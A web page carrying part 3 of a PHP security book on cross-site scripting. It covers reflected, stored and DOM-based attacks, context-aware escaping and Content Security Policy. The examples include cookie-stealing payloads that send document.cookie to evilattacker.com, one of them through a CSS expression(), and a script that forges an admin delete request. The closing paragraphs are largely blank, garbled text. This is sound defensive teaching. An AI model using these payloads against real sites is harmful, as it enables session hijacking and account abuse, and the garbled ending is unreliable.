<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>The book "Security in PHP" (part 3). Cross-site scripting (XSS)</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="The book "Security in PHP" (part 1) 
 The book "Security in PHP" (part 2) 


 Cross-site scripting (XSS) is perhaps the most common type of vulnerabil...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>The book "Security in PHP" (part 3). Cross-site scripting (XSS)</h1><div class="post__text post__text-html js-mediator-article"><p><img src="https://habrastorage.org/webt/kj/cs/0z/kjcs0zr5s2m6clcvfwwxvi9874c.jpeg"></p><br><p>  <a href="https://habrahabr.ru/company/mailru/blog/310726/">The book "Security in PHP" (part 1)</a> <br>  <a href="https://habrahabr.ru/company/mailru/blog/352440/">The book "Security in PHP" (part 2)</a> </p><br><p>  Cross-site scripting (XSS) is perhaps the most common type of vulnerability widespread in web applications.  According to statistics, about 65% of sites in one form or another are vulnerable to XSS attacks.  This data should scare you just as they scare me. </p><a name="habracut"></a><br><h4 id="chto-takoe-mezhsaytovyy-skripting">  <em>What is crossite scripting?</em> </h4><br><p>  A XSS attack occurs when an attacker gains the ability to inject a script (often JavaScript) into a page issued by a web application and execute it in the client‚Äôs browser.  This is usually done by switching the context of the HTML data into the script context, most often when a new HTML, Javascript or CSS markup code is introduced.  HTML has enough places to add an executable script to a page, and browsers provide many ways to do this.  Any input to a web application, such as HTTP request parameters, is capable of embedding code. </p><br><p>  One of the problems associated with XSS is the constant underestimation of programmers, which is atypical for vulnerabilities of such a serious level.  Developers often do not realize the degree of threat and usually build a defense based on misconceptions and bad approaches.  This is especially true of PHP, if the code is written by developers without sufficient skills and knowledge.  In addition, real-life examples of XSS attacks look simple and naive, so the programmers who study them consider their protection sufficient as long as it suits them.  It is not difficult to understand where 65% of vulnerable sites come from. </p><br><p>  If an attacker can inject javascript into web pages and execute it, then he is able to execute any javascript in the user's browser.  And it gives you complete control.  Indeed, from the point of view of the browser, the script was obtained from a web application, which is automatically considered a reliable source. </p><br><p>  Therefore I want to remind: any data that was not created by PHP for the current request is unreliable.  This also applies to the browser, which works separately from the web application. </p><br><p>  The browser trusts everything it receives from the server, and this is one of the main reasons for cross-site scripting.  Fortunately, the problem is solved, as we will discuss below. </p><br><p>  We can apply this principle even more broadly to the JavaScript application environment itself in the browser.  Client-side JavaScript code ranges from very simple to extremely complex, often a separate client-side web application.  Such applications should be protected no worse than any other.  They should not trust data received from remote sources (including from the application on the server), applying validation and making sure that the content displayed in the DOM is correctly shielded or processed. </p><br><p>  Embedded scripts can be used for a variety of tasks.  It: </p><br><ul><li>  theft of cookies and authorization data, </li><li>  performing HTTP requests on behalf of the user, </li><li>  redirect users to infected sites, </li><li>  getting access to read and change the browser's local storage, </li><li>  performing complex calculations and sending results to the attacker's server, </li><li>  Apply exploits to the browser and download malware, </li><li>  emulation of user activity for clickjacking, </li><li>  rewriting or gaining control over browser applications, </li><li>  attacks on browser extensions - </li></ul><br><p>  and so on, you can continue to infinity. </p><br><h4 id="podmena-interfeysa-ui-redress-clickjacking">  <em>Interface spoofing (UI Redress, clickjacking)</em> </h4><br><p>  While the direct attack on the server is completely independent, clickjacking is inextricably linked with cross-site scripting, as it uses similar sets of vectors to attack.  Sometimes they are difficult to distinguish, because one attack technique helps the successful execution of another. </p><br><p>  Interface spoofing is any attacker's attempt to change the user interface of a web application.  This allows an attacker to inject new links, a new HTML code to resize, hide / block the original interface, etc. If such an attack is performed to trick the user into clicking on the embedded link or button, then it is usually referred to as clickjacking. </p><br><p>  Most of this chapter deals with interface spoofing with XSS.  However, there are other methods of substitution when using frames for implementation.  We will discuss this in more detail in Chapter 4. </p><br><h4 id="primer-mezhsaytovogo-skriptinga">  <em>Cross-site scripting example</em> </h4><br><p>  Let's imagine that the attacker stumbled upon a forum that allows users to display a small signature under their comments.  The attacker creates an account, spamming in all topics within reach, applying the following signature to his messages: </p><br><pre><code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.write(</span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'&lt;iframe src="http://evilattacker.com?cookie='</span></span></span><span class="javascript"> + </span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">document</span></span></span><span class="javascript">.cookie.escape() + </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">'" height=0 width=0 /&gt;'</span></span></span><span class="javascript">);</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  By some miracle, the forum engine includes this signature in all spammed topics, and users begin to download this code.  The result is obvious.  The attacker injects an iframe into the page, which will be displayed as a tiny dot (size zero) at the very bottom of the page, without attracting any attention.  The browser will send a request for the content of the iframe, and the values ‚Äã‚Äãof the cookies of each forum participant will be transferred to the attacker's URI as a GET parameter.  They can be compared and used for further attacks.  While ordinary participants are not interested in an attacker, well-planned trolling will undoubtedly attract the attention of a moderator or administrator, whose cookies can be very useful for gaining administrative access to the forum. </p><br><p>  This is a simple example, but you can extend it.  Suppose an attacker wants to know the name of the user associated with the stolen cookies.  Easy!  It is enough to add a DOM request code to the attacker's URL, which will return the name and include it in the parameter username = GET request.  Or did the attacker need browser information to bypass the session fingerprint protection?  It is enough to enable data from navigator.userAgent. </p><br><p>  This simple attack has many consequences.  For example, you can get administrator rights and control over the forum.  Therefore, it is not advisable to underestimate the possibilities of XSS attack. </p><br><p>  Of course, in this example there is a flaw in the attacker's approach.  Consider the obvious way to protect.  All cookies with sensitive data are flagged with HttpOnly, which prevents JavaScript from accessing the data in these files.  Basically, you should remember that if an attacker injects javascript, then this script will be able to do anything.  If the attacker did not get access to the cookie and conduct an attack using it, then he will do what all good programmers must do: write the code for an effective automated attack. </p><br><pre> <code class="hljs xml"> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="actionscript"><span class="actionscript"> </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> params = </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'type=topic&amp;action=delete&amp;id=347'</span></span></span><span class="actionscript">; </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">var</span></span></span><span class="actionscript"> http = </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">new</span></span></span><span class="actionscript"> XMLHttpRequest(); http.open(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'POST'</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">'forum.com/admin_control.php'</span></span></span><span class="actionscript">, </span><span class="hljs-literal"><span class="actionscript"><span class="hljs-literal">true</span></span></span><span class="actionscript">); http.setRequestHeader(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"Content-type"</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"application/x-www-form-urlencoded"</span></span></span><span class="actionscript">); http.setRequestHeader(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"Content-length"</span></span></span><span class="actionscript">, params.length); http.setRequestHeader(</span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"Connection"</span></span></span><span class="actionscript">, </span><span class="hljs-string"><span class="actionscript"><span class="hljs-string">"close"</span></span></span><span class="actionscript">); http.onreadystatechange = </span><span class="hljs-function"><span class="hljs-keyword"><span class="actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="hljs-params"><span class="actionscript"><span class="hljs-function"><span class="hljs-params">()</span></span></span></span><span class="actionscript"><span class="hljs-function"> </span></span></span><span class="actionscript">{ </span><span class="hljs-keyword"><span class="actionscript"><span class="hljs-keyword">if</span></span></span><span class="actionscript">(http.readyState == </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">4</span></span></span><span class="actionscript"> &amp;&amp; http.status == </span><span class="hljs-number"><span class="actionscript"><span class="hljs-number">200</span></span></span><span class="actionscript">) { </span><span class="hljs-comment"><span class="actionscript"><span class="hljs-comment">// Do something else. } }; http.send(params); </span></span></span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Above is one of the ways to send a POST request that removes a forum topic.  You can set it to work only for the moderator (i.e., if the username is displayed somewhere, we can compare it with a list of known moderators or find special styles applied to the moderator). </p><br><p>  As follows from the above, HttpOnly cookies have limited use in protection against XSS.  They block the capture of cookies, but do not prevent their use during an XSS attack.  In addition, the attacker would prefer not to leave traces in the visible markup, so as not to arouse suspicion if he does not want to be detected. </p><br><h2 id="tipy-xss-atak">  Types of XSS Attacks </h2><br><p>  Attacks using XSS can be classified in several ways.  One of them is by the way in which malicious input data get into web applications.  The application's input data can include the result of the current query, which is saved for inclusion in a subsequent output query.  Or data can be transferred to JavaScript-based DOM operations.  Thus, the following types of attacks are obtained. </p><br><h3 id="otrazhyonnaya-xss-ataka">  Reflected XSS attack </h3><br><p>  Here, the unreliable input data sent to the web application is immediately included in the application output data, i.e. it is ‚Äúreflected‚Äù from the server to the browser in the same request.  Reflection happens with error messages, search materials, previews of posts, etc. This form of attack can be organized to convince the user to follow the link or send data from the attacker's form.  To force the user to click on unreliable links, sometimes social engineering, an interface spoofing attack or link shortening service is required.  Social networks and link shortening services themselves are particularly vulnerable to URL spoofing using shortened links, since such links are common on these resources.  Be careful and carefully check what you press! </p><br><h3 id="hranimaya-xss-ataka">  Stored xss attack </h3><br><p>  When a malicious payload is somewhere stored and retrieved as the user views the data, the attack is stored.  In addition to databases, there are many other places, including caches and logs, which are also suitable for long-term data storage.  Already known cases of attacks with the introduction of the logs. </p><br><h3 id="xss-ataka-na-osnove-dom">  DOM-based XSS attack </h3><br><p>  A DOM-based attack can be both echoed and stored.  The difference is in what the attack is aimed at.  Most often try to immediately change the markup of the HTML-document.  However, HTML can also be modified using JavaScript using the DOM.  Elements successfully implemented in HTML can later be used in DOM operations in JavaScript.  Attacks also target vulnerabilities in JS libraries or their incorrect use. </p><br><h2 id="mezhsaytovyy-skripting-i-kontekst-vnedreniya">  Cross-site scripting and deployment context </h2><br><p>  An XSS attack succeeds if context is implemented during it.  The term ‚Äúcontext‚Äù describes how browsers interpret the contents of an HTML document.  Browsers recognize a number of key contexts, including HTML code, HTML attributes, JavaScript, URLs, CSS. </p><br><p>  The attacker's goal is to take data intended for one of these contexts and force the browser to interpret it in another context.  For example: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"background:&lt;?php echo $colour ?&gt;;"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  $ color is filled from the database of user settings that affect the background color for the text block.  The value is entered in the context of CSS, a child of the context of the HTML attribute.  That is, we added CSS to the style attribute.  It may not seem necessary to avoid such a trap with a context, but look at the following example: </p><br><pre> <code class="hljs xml">$colour = "expression(document.write('<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">" .= "</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evilattacker.com</span></span></span><span class="hljs-tag">?</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">' + document.cookie.escape() + " .= "'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag"> /&gt;</span></span>'))"; <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"background:&lt;?php echo $colour ?&gt;;"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  If an attacker successfully embeds this color, he can embed a CSS expression that will execute certain JavaScript in Internet Explorer.  In other words, the attacker will be able to switch the current context by introducing a new JavaScript context. </p><br><p>  Looking at the previous example, some readers will recall escaping.  We use it: </p><br><pre> <code class="hljs xml">$colour = "expression(document.write('<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">" .= "</span></span></span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">http:</span></span></span><span class="hljs-tag">//</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">evilattacker.com</span></span></span><span class="hljs-tag">?</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">cookie</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">' + document.cookie.escape() + " .= "'</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag"> /&gt;</span></span>'))"; <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">style</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"background:&lt;?php echo htmlspecialchars($colour, ENT_QUOTES, 'UTF-8') ?&gt;;"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  If you check it in IE, you will quickly find out that something very bad is happening.  The XSS attack still works successfully - even after shielding with the htmlspecialchars () function to avoid $ color! </p><br><p>  This is how important it is to understand the context correctly.  Each context requires a different screening method, because each context has its own special characters and different need for screening.  It is not enough to scatter htmlspecialchars () and htmlentities () functions everywhere and pray that your web application is safe. </p><br><p>  What went wrong in the previous example?  What caused the browser to unscramble HTML attributes before interpreting the context?  We ignored the fact that two contexts need to be screened. </p><br><p>  First, the CSS should have escaped $ color, and only then - escaped HTML.  This would ensure that $ color is converted to the correct string literal, without brackets, quotes, spaces, and other characters that allow expression () to be injected.  Not realizing that our attribute covered two contexts, we screened it as if it were just one HTML attribute.  Quite a common mistake. </p><br><p>  A lesson can be learned from this situation: context is important.  With a XSS attack, an attacker will always try to jump from the current context to another, where you can execute JavaScript.  If you are able to determine all contexts in the HTML output stream with regard to their nesting, then you are ten steps closer to successfully protecting a web application from XSS. </p><br><p>  Let's look at another example: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.example.com"</span></span></span><span class="hljs-tag">&gt;</span></span>Example.com<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">a</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  If you do not take into account unreliable input data, then this code can be analyzed as follows: </p><br><ol><li>  There is a URL context, i.e. the value of the href attribute. </li><li>  There is an HTML attribute context, i.e. parents of the URL context. </li><li>  There is an HTML body context, i.e. the text inside the <code>&lt;a&gt;</code> tag. </li></ol><br><p>  These are three different contexts.  So it will take up to three screening methods if the data sources are identified as unreliable.  In the next section, we take a closer look at screening as protection against XSS. </p><br><h2 id="zaschita-ot-mezhsaytovogo-skriptinga">  Cross-site scripting protection </h2><br><p>  It is possible to protect oneself from XSS, but protection should be applied consistently, without exceptions and simplifications, preferably from the very beginning of developing a web application, while everyone has a fresh memory of the workflow.  Implementing protection at later stages can be expensive. </p><br><h3 id="proverka-vhodnyh-dannyh">  Input Validation </h3><br><p>  Input validation is only the first line of protection for a web application.  With this type of protection, we only know how unreliable data is being used now, and at the stage of obtaining data we cannot predict where and how they will be applied further.  This includes almost all textual data, since we must always provide the user with the ability to write quotes, angle brackets and other characters. </p><br><p>  Verification works best by preventing XSS attacks on data that have limit values.  Suppose an integer should not contain HTML-specific characters.  Parameters, such as the name of the country, must correspond to a predetermined list of real countries, etc. </p><br><p>  Input validation helps control data with a specific syntax.  For example, a valid URL must begin with the http: // or https: // prefix, and not with much more dangerous javascript: or data: constructs.  In fact, all addresses obtained from unverified input data should be checked for the presence of these tags.  Escaping javascript: or data: URIs has the same effect as escaping a legal URL.  That is, no effect at all. </p><br><p>  Although validating the input data cannot block the entire malicious payload during a XSS attack, it can stop the most obvious types of attack.  Verification of input data was discussed in detail in the second part of the book. </p><br><h3 id="ekranirovanie-a-takzhe-kodirovanie">  Escaping (and encoding) </h3><br><p>  Escaping data at the output ensures that the data will not be mistakenly perceived by the receiving parser or interpreter.  Obvious examples are the ‚Äúless‚Äù and ‚Äúmore‚Äù signs, which denote HTML tags.  If you allow these characters to be inserted from unreliable input data, the attacker will be able to enter new tags that the browser will draw.  Typically, these characters are replaced by the sequences&gt; and $ lt ;. </p><br><p>  Replacing characters involves the preservation of meaning shielded data.  Escaping simply replaces characters that have a specific meaning with alternative ones.  Typically, a hexadecimal representation or something more readable is used, such as HTML sequences (if they are safe to use). </p><br><p>  As mentioned in the chapter on contexts, the method of screening depends on what type of content is being injected.  HTML escaping is different from JavaScript escaping, which, in turn, is different from escaping addresses.  Applying the wrong shielding strategy for a particular context can lead to ineffective protection, creating vulnerabilities that can be exploited by an attacker. </p><br><p>  To facilitate shielding, a separate class developed for this purpose is recommended.  PHP cannot provide all the necessary screening functions out of the box, and much of the proposed is not as safe as most developers believe. <br>  Let's look at the screening rules that apply to the most common contexts: HTML body, HTML attributes, JavaScript, URLs, and CSS. </p><br><h3 id="nikogda-ne-vvodite-dannye-za-isklyucheniem-vvoda-iz-doverennyh-mest">  Never enter data, except from trusted locations. </h3><br><p>  Before you learn screening strategies, you need to make sure that your web application templates do not lose (misplace) data.  This refers to embedding data in sensitive areas of HTML that give an attacker the ability to influence the way the markup is processed and which usually do not require shielding when used by the programmer.  Consider examples where [...] is the data being injected: </p><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"><span class="undefined">...</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-comment"><span class="hljs-comment">&lt;!--...--&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">...</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"test"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">...</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://www.example.com"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"><span class="undefined">...</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">style</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Each of the above places is dangerous.  Allowing data in the script tag, outside of string and numeric literals, allows you to inject JavaScript during an attack.  Data placed in HTML comments can be used to launch Internet Explorer conditionals (conditionals) and for other unforeseen actions.  The following two places are more obvious, since no one would allow an attacker to influence their tags or attribute names - we are just trying to prevent it!  Finally, as is the case with scripts, we cannot allow attackers to infiltrate directly into CSS, as this will make it possible to conduct interface spoofing attacks and execute scripts using expression () supported in Internet Explorer. </p><br><h2 id="vsegda-ekraniruyte-html-do-vnedreniya-dannyh-v-html-telo">  Always escape HTML before embedding data into the HTML body. </h2><br><p>  The HTML body context refers to textual content that is enclosed in tags.  For example, text between <code>&lt;body&gt;</code> , <code>&lt;div&gt;</code> tags, or any other paired tags to store text.  The data embedded in the content of any tags must be escaped under HTML. </p><br><p>  HTML escaping is well known in PHP as the htmlspecialchars () function. </p><br><h2 id="vsegda-ekraniruyte-html-atributy-do-vnedreniya-dannyh-v-ih-kontekst">  Always escape HTML attributes before embedding data in their context. </h2><br><p>  The HTML attribute context refers to all element values, with the exception of properties that are interpreted by the browser as CDATA.  This exception is rather confusing, but mainly refers to HTML standards that are not based on XML, where JavaScript can be included in the event attributes in an unshielded form.  For all other attributes, you have the following two options: </p><br><ol><li>  If the attribute value is in quotes, then you MAY use HTML escaping. </li><li>  However, if the value is given without quotes, then you MUST use HTML attribute escaping. </li></ol><br><p>  Also, the second option applies when the rules for casting attributes may be unclear.  For example, in HTML5 it is considered quite acceptable to use attribute values ‚Äã‚Äãwithout quotes, and in real projects there are already many examples of such a ‚Äúsmart‚Äù approach.  In any incomprehensible situation, proceed with caution. </p><br><h2 id="vsegda-ekraniruyte-javascript-do-vnedreniya-v-znacheniya-dannyh">  Always escape javascript before embedding in data values. </h2><br><p>  The data values ‚Äã‚Äãin javascript are mostly string.  Since you cannot escape numbers, there is an additional rule: always check the validity of numbers ... </p><br><h2 id="politika-zaschity-kontenta">  Content Protection Policy </h2><br><p>  A key element of all our cross-site scripting conversations is that the browser without question executes all the JavaScript code that it receives from the server, regardless of the source code.  When retrieving an HTML document, the browser cannot find out which of the nested resources are safe and which are not.  And if we could change that? </p><br><p>  Content Protection Policy (CSP) is an HTTP header that conveys a white list of trusted resources that the browser can trust.  Any source not specified in the list of allowed sources is considered unreliable and is simply ignored.  Consider the following: </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span></code> </pre> <br><p>  This CSP header tells the browser to trust only those JavaScript source addresses that point to the current domain.  After the browser will load scripts from this source, but completely ignore all others.  It means that <a href=""></a>  <a href="">http://attacker.com/naughty.js</a> will not load if the attacker somehow manages to implement it.  In addition, all embedded scripts, for example tags <br></p><p>  If you need to use JavaScript from a source other than the source address, then we can include it in the white list.  For example, let's add the jQuery CDN address. </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com</code> </pre> <br><p>  You can add other resource directives, such as the path to a CSS style sheet, separating the directives and allowed addresses with a semicolon. </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com; style-src <span class="hljs-string"><span class="hljs-string">'self'</span></span></code> </pre> <br><p>  The format of the header value is very simple.  The value consists of the script-src directive, followed by a list of sources separated by spaces, used as a white list.  The source can be a keyword in quotes, such as 'self', or a URL.  The value of the URL is matched to the list received.  Information missing in the URL can be freely modified in the HTML document.  Note <a href="http://code.jquery.com/"></a>  <a href="http://code.jquery.com/">http://code.jquery.com</a> prevents scripts from being downloaded from <a href="http://jquery.com/"></a>  <a href="http://jquery.com/">http://jquery.com</a> or <a href="http://domainx.jquery.com/"></a>  <a href="http://domainx.jquery.com/">http://domainx.jquery.com</a> , because we explicitly set the allowed domains.  To allow all subdomains, you can simply specify <a href="http://jquery.com/"></a>  <a href="http://jquery.com/">http://jquery.com</a> .  The same applies to local paths, ports, URL schemes, etc. </p><br><p>  The essence of the CSP white list is simple.  If you create a list of resources of a particular type, then everything that does not go into it will not load.  If you do not define a list for the type of resources, then the default browser discards all resources of this type. </p><br><p>  The following resource directives are supported: </p><br><ul><li>  <strong>connect-src:</strong> limits the sources to which you can connect using xmlhttprequest, web sockets, etc. </li><li>  <strong>font-src:</strong> restricts sources for web fonts. </li><li>  <strong>frame-src:</strong> limits the URLs for frames. </li><li>  <strong>img-src:</strong> limits image sources. </li><li>  <strong>media-src:</strong> limits the sources of video and audio. </li><li>  <strong>object-src:</strong> restricts sources for Flash and other plugins. </li><li>  <strong>script-src:</strong> limits sources for script files. </li><li>  <strong>style-src:</strong> restricts sources for CSS. </li></ul><br><p>  To set safe standard parameters, there is a special directive default-src, with which you can initially add links to all the listed categories to the white list. </p><br><pre> <code class="hljs pgsql">X-Content-<span class="hljs-keyword"><span class="hljs-keyword">Security</span></span>-<span class="hljs-keyword"><span class="hljs-keyword">Policy</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>-src <span class="hljs-string"><span class="hljs-string">'self'</span></span>; script-src <span class="hljs-string"><span class="hljs-string">'self'</span></span> http://code.jquery.com</code> </pre> <br><p>  This will limit the allowed resources to the current domain, but also add an exception for the jQuery script.            ,    . </p><br><p>  URL,       ,       : </p><br><pre> <code class="hljs rust"><span class="hljs-symbol"><span class="hljs-symbol">'none</span></span><span class="hljs-string"><span class="hljs-string">' '</span></span><span class="hljs-keyword"><span class="hljs-keyword">self</span></span><span class="hljs-string"><span class="hljs-string">' '</span></span><span class="hljs-keyword"><span class="hljs-keyword">unsafe</span></span>-inline<span class="hljs-string"><span class="hljs-string">' '</span></span><span class="hljs-keyword"><span class="hljs-keyword">unsafe</span></span>-eval'</code> </pre> <br><p>    unsafe, . . ¬´¬ª?    CSP ‚Äî   ,   .    inline-   ?     inline-,   -      inline-  .        addEventListener()   .       ,        ,   ?  Not this way.    .   'unsafe-inline'     CSP. </p><br><p>   'none'   ¬´¬ª.       ,         .     